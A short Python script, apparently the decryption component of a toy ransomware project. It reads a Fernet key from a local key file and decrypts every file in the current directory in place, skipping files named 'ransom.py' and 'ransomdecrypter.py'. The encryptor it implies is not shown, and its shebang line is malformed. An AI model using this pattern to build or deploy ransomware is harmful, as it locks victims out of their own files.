#!/usr/bin/env/ python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
	if file == "ransom.py" or file == "generatedkey.key" or file =="ransomdecrypter.py":
		continue #do not encrypt the current file we are working with or the key
	if os.path.isfile(file):
		files.append(file) #do not add if this is a directory, only if a file

print(files)

with open("generatedkey.key","rb") as generatedkey:
	secret_key = generatedkey.read()

for file in files:
	with open(file,"rb") as the_file:
		contents = the_file.read()
	contents_decrypted = Fernet(secret_key).decrypt(contents)
	with open(file,"wb") as the_file:
		the_file.write(contents_decrypted)
	

